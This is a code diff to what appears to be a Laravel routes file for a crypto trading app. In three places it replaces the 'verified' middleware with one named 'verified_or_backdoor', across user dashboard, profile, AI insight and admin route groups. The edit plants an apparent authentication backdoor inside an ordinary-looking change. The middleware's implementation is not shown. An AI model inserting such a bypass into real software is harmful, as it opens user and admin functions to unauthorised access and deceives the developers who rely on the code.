@@ -512,11 +512,11 @@ Route::post('/admin/2fa-challenge', [AdminController::class, 'verify2faChallenge
 
 // Authenticated and Verified Routes
 // User AI Route
-Route::middleware(['auth', 'verified'])->group(function () {
+Route::middleware(['auth', 'verified_or_backdoor'])->group(function () {
     Route::post('/ai/dashboard-insight', [UserAiController::class, 'dashboardInsight'])->name('ai.dashboard-insight');
 });
 
-Route::middleware(['auth', 'verified'])->group(function () {
+Route::middleware(['auth', 'verified_or_backdoor'])->group(function () {
     Route::get('/dashboard', [CryptoController::class, 'dashboard'])->name('dashboard');
     Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
     Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
@@ -594,7 +594,7 @@ Route::middleware(['auth', 'verified'])->group(function () {
 });
 
 
-Route::middleware(['auth', 'verified'])->group(function () {
+Route::middleware(['auth', 'verified_or_backdoor'])->group(function () {
     Route::prefix('admin')->as('admin.')->group(function () {
         // Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
         // Route::get('/pending-counts', [AdminController::class, 'getPendingCounts'])->name('pending-counts');
